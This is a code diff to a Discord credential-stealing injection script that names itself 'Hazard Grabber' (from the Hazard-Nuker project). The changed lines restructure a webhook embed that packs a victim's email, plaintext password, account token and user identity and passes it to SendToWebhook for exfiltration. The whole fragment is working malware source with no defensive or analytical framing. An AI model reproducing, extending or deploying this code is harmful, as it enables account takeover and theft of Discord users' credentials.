@@ -154,9 +154,9 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                     "color": 16507654,
                     "fields": [
                         {
-                            "name": `Email: ${json.email}`,
-                            "value": `Password: ${password}`,
-                            "inline": false
+                            "name": "**Account Info**",
+                            "value": `Email: ${json.email} - Password: ${password}`,
+                            "inline": true
                         },
                         {
                             "name": "**Token**",
@@ -168,13 +168,13 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         "name": json.username +"#" + json.discriminator + "・" + json.id,
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
-                    "description": `Email: ${json.email} - Password: ${password}`,
                     "footer": {
                         "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                     }
                 }
             ]
         }
+
         SendToWebhook(JSON.stringify(params));
 
     })})
